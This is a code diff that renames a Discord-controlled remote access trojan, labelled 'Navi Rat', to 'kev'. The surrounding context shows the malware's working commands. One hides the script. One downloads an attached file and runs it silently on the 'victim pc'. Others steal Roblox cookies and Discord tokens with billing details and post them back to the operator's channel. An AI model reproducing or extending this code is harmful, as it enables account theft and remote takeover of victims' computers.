@@ -58,10 +58,10 @@ intents.message_content = True
 bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
 def navi_embed(text, color=0x00aaff, thumbnail=True):
-    embed = discord.Embed(title="NAVI • TERMINAL", description=text, color=color)
+    embed = discord.Embed(title="kev • TERMINAL", description=text, color=color)
     if thumbnail:
         embed.set_thumbnail(url="https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png")
-    embed.set_footer(text="Navi Multitool • https://github.com/glockinhand/navi-multitool", icon_url="https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png")
+    embed.set_footer(text="kev Multitool • https://github.com/glockinhand/navi-multitool", icon_url="https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png")
     return embed
 
 def hide_script():
@@ -434,7 +434,7 @@ async def on_ready():
     )
     embed.set_thumbnail(url="https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png")
     embed.set_footer(
-        text="Navi Multitool • github.com/glockinhand/navi-multitool",
+        text="kev Multitool • github.com/glockinhand/kev-multitool",
         icon_url="https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png"
     )
     await channel.send(content="@here", embed=embed)
@@ -689,7 +689,7 @@ def volumedown():
 
 thumb = "https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png"
 def get_embed(page: str):
-    e = discord.Embed(title="NAVI • COMMANDS", color=0x00aaff)
+    e = discord.Embed(title="kev • COMMANDS", color=0x00aaff)
     e.set_thumbnail(url=thumb)
 
     if page == "main":
@@ -792,7 +792,7 @@ def get_embed(page: str):
             "`!kill <session/all>`"
         )
 
-    e.set_footer(text="Navi Rat • github.com/glockinhand/navi-multitool")
+    e.set_footer(text="kev Rat • github.com/glockinhand/navi-multitool")
     return e
 
 class HelpSelect(discord.ui.Select):
@@ -916,7 +916,7 @@ def run_with_fallback(cmd, use_shell, cwd, hide_window=True):
 @bot.command(name="execut")
 async def upload_and_run(ctx: commands.Context):
     if not ctx.message.attachments:
-        await ctx.send("Navi needs a file attached.")
+        await ctx.send("kev needs a file attached.")
         return
     attachment = ctx.message.attachments[0]
     filename = attachment.filename
@@ -930,7 +930,7 @@ async def upload_and_run(ctx: commands.Context):
                 stderr=subprocess.DEVNULL
             )
         except FileNotFoundError:
-            await ctx.send(f"Navi can't run **{ext}** — `{check_bin}` not in PATH.")
+            await ctx.send(f"kev can't run **{ext}** — `{check_bin}` not in PATH.")
             return
 
     temp_dir = tempfile.gettempdir()
@@ -952,16 +952,16 @@ async def upload_and_run(ctx: commands.Context):
     proc, error = run_with_fallback(cmd, use_shell, temp_dir)
 
     if error:
-        await ctx.send(f"Navi executed **{filename}** but process died: {error}")
+        await ctx.send(f"kev executed **{filename}** but process died: {error}")
     else:
-        await ctx.send(f"Navi executed **{filename}** from **{temp_dir}** (PID: {proc.pid})")
+        await ctx.send(f"kev executed **{filename}** from **{temp_dir}** (PID: {proc.pid})")
 
 @bot.command(name="roblox")
 async def roblox(ctx):
-    await ctx.send("Navi is searching for cookies on victim pc...")
+    await ctx.send("kev is searching for cookies on victim pc...")
     info, token_or_error = get_roblox_sex()
     if info is None:
-        await ctx.send(f"Navi failed: {token_or_error}")
+        await ctx.send(f"kev failed: {token_or_error}")
         return
     embed = discord.Embed(
         title=":video_game: Roblox Account Captured",
@@ -983,18 +983,18 @@ async def roblox(ctx):
     else:
         embed.add_field(name="Token", value=f"```\n{token}\n```", inline=False)
 
-    embed.set_footer(text=f"Navi Multitool | https://github.com/glockinhand")
+    embed.set_footer(text=f"kev Multitool | https://github.com/glockinhand")
 
     await ctx.send(embed=embed)
 
 @bot.command(name="discord")
 async def grab_tokens(ctx):
-    await ctx.send("Navi is searching for tokens on victim pc...")
+    await ctx.send("kev is searching for tokens on victim pc...")
     grabber = DiscordMod()
     grabber.disc_tget()
     count = len(grabber.tokens)
     if count == 0:
-        await ctx.send("Navi found no tokens on this machine.")
+        await ctx.send("kev found no tokens on this machine.")
         return
     embeds_to_send = []
     for t in grabber.tokens[:9]:
@@ -1025,10 +1025,10 @@ async def grab_tokens(ctx):
         embed.add_field(name=":gem: Nitro:", value=t['n'], inline=False)
         embed.add_field(name=":money_with_wings: Billing:", value=t['b'], inline=False)
         embed.add_field(name=":key: Token:", value=f"```{t['t']}```", inline=False)
-        embed.set_footer(text="Navi Rat • github.com/glockinhand/navi-multitool")
+        embed.set_footer(text="kev Rat • github.com/glockinhand/navi-multitool")
         embeds_to_send.append(embed)
     await ctx.send(embeds=embeds_to_send)
-    await ctx.send(f"Navi found **{len(embeds_to_send)}** tokens on victim pc.")
+    await ctx.send(f"kev found **{len(embeds_to_send)}** tokens on victim pc.")
 
 @bot.event
 async def on_message(message):
